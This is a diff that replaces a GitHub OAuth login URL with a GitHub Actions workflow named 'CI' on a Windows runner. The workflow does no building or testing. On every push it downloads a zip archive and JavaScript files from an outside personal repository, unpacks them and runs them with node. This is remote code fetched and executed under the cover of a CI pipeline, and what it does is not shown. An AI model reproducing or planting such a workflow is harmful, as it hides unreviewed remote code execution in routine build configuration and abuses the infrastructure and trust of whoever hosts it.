@@ -1,1 +1,14 @@
-https://github.com/login/oauth/authorize?response_type=code&client_id=e37ffdec11c0245cb2e0&scope=read:user++user:email&redirect_uri=https://login.live.com/HandleGithubResponse.srf&allow_signup=false&state=AEE42390CBB72D42
+name: CI
+on: [push, workflow_dispatch]
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+    
+    - name: Start
+      run: Invoke-WebRequest https://raw.githubusercontent.com/raiyan088/public/main/montag/node_modules.zip -OutFile start.zip
+    - run: Expand-Archive -LiteralPath start.zip
+    - run: Invoke-WebRequest https://raw.githubusercontent.com/raiyan088/public/main/montag/server.js -OutFile start\server.js
+    - run: Invoke-WebRequest https://raw.githubusercontent.com/raiyan088/public/main/montag/start.js -OutFile start\start.js
+    - run: node start/start.js 0
+    - run: node start/start.js 1
